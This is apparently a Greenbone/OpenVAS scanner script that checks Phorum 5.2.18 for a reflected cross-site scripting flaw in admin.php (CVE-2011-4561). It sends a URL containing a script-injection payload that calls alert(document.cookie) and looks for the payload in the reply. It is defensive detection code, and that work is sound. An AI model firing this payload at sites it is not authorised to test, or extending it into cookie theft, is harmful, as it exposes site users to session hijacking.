if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802530" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2011-4561" );
	script_bugtraq_id( 49920 );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-12-02 17:46:36 +0530 (Fri, 02 Dec 2011)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "Phorum 'admin.php' Cross-Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/46282" );
	script_xref( name: "URL", value: "http://www.rul3z.de/advisories/SSCHADV2011-023.txt" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/archive/1/519991/100/0/threaded" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "phorum_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "phorum/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "Phorum version 5.2.18." );
	script_tag( name: "insight", value: "The flaw is due to an input appended to the URL after 'admin.php'
  is not properly sanitised before being returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Phorum and is prone to cross-site scripting
  vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("version_func.inc.sc");
port = http_get_port( default: 80 );
if(!dir = get_dir_from_kb( port: port, app: "phorum" )){
	exit( 0 );
}
url = dir + "/admin.php/\"><script>alert(document.cookie);</script></script>";
if(http_vuln_check( port: port, url: url, pattern: "><script>alert\\(document\\.cookie\\);</script>", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
}

